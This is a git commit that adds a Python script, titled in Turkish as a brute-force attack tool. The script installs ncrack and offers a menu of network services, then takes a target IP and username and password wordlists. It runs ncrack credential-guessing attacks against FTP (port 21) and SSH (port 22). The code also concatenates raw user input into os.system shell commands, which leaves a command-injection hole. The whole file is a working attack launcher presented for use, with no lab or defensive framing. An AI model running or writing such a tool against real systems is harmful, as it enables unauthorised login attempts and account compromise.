a0db265ee22d083836db25d899a3504fbe880eac
EkremCan <84201859+EkremCan35@users.noreply.github.com>
2021-05-14 23:34:56 +0300

    Create kabakuvvet.py

---
+++ kabakuvvet.py
@@ -0,0 +1,30 @@
+import os
+os.system("apt-get install figlet")
+os.system("apt-get install ncrack")
+os.system("clear")
+os.system("figlet CHEESTERORJ")
+print(""" 
+Kaba Kuvvet Saldırısına Hoşgeldiniz
+
+1) FTP
+2) SSH
+3) TELNET
+4) HTTP
+5) SMB
+6) RDP
+7) VNC
+8) SIP
+9) REDİTS
+10) POSTGRESQL
+11) MYSQL
+
+Bu Saldırı Ekrem Can Tarafındann yapılmıştır.
+""")
+islemno = input("İşlem No Giriniz : ")
+hedefip = input("Hedef İp Giriniz : ")
+kullaniciadi = input("Kullanıcı Adı Dosya Yolu : ")
+sifre = input("Sifrelerin Bulunduğu Dosya Yolu : ")
+if(islemno == "1"):
+    os.system("ncrack -p 21 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)
+if(islemno == "2"):
+    os.system("ncrack -p 22 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)
